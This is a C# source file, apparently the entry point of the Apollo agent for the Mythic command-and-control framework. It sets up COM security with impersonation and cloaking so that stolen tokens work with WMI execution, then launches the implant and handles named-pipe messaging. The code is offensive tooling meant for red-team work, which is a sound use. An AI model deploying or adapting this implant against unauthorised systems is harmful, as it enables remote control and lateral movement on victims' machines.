﻿using System;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using System.Linq;
using System.Collections.Concurrent;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using System.Runtime.InteropServices;
using ApolloInterop.Utils;

namespace Apollo
{
    class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private static AutoResetEvent _connected = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static Action<object> _sendAction;
        private static CancellationTokenSource _cancellationToken = new CancellationTokenSource();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static AutoResetEvent _complete  = new AutoResetEvent(false);
        private static bool _completed;
        private static Action<object> _flushMessages;
        public enum RPC_AUTHN_LEVEL
        {
            PKT_PRIVACY = 6
        }

        public enum RPC_IMP_LEVEL
        {
            IMPERSONATE = 3
        }

        public enum EOLE_AUTHENTICATION_CAPABILITIES
        {
            DYNAMIC_CLOAKING = 0x40
        }
        [DllImport("ole32.dll")]
        static extern int CoInitializeSecurity(IntPtr pSecDesc, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1, RPC_AUTHN_LEVEL dwAuthnLevel, RPC_IMP_LEVEL dwImpLevel, IntPtr pAuthList, EOLE_AUTHENTICATION_CAPABILITIES dwCapabilities, IntPtr pReserved3);
        // we need this to happen first so we can use impersonation tokens with wmiexecute
        static readonly int _security_init = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RPC_AUTHN_LEVEL.PKT_PRIVACY, RPC_IMP_LEVEL.IMPERSONATE, IntPtr.Zero, EOLE_AUTHENTICATION_CAPABILITIES.DYNAMIC_CLOAKING, IntPtr.Zero);
        public static void Main(string[] args)
        {
            if (_security_init != 0)
            {
                DebugHelp.DebugWriteLine($"CoInitializeSecurity status: {_security_init}");
            }
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }

        private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _complete.Set();
        }

        private static void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected)
            {
                pipe.EndWrite(result);
                if (!_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] bdata))
                {
                    pipe.BeginWrite(bdata, 0, bdata.Length, OnAsyncMessageSent, pipe);
                }
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCData d = args.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            Console.Write(msg);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _receiverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }
    }
}
